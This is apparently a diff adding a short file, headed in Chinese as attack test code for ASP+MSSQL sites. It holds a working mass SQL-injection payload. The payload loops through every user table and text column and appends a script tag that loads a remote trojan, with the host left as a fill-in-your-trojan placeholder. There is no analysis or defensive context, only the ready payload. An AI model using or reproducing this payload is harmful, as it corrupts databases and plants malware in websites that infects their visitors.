@@ -1,0 +1,2 @@
+针对ASP+MSSQL攻击测试代码: 
+DECLARE @T varchar(255),@C varchar(255) DECLARE Table_Cursor CURSOR FOR select a.name,b.name from sysobjects a,syscolumns b where a.id=b.id and a.xtype='u' and ( b.xtype=99 or b.xtype=35 or b.xtype=231 or b.xtype=167) OPEN Table_Cursor FETCH NEXT FROM Table_Cursor INTO @T,@C WHILE(@@FETCH_STATUS=0) BEGIN exec('update [ '+@T+'] set ['+@C+']=rtrim(convert(varchar,['+@C+']))+''<script src=http://www.填入你的马/g .js></script>''')FETCH NEXT FROM Table_Cursor INTO @T,@C END CLOSE Table_Cursor DEALLOCATE Table_Cursor 
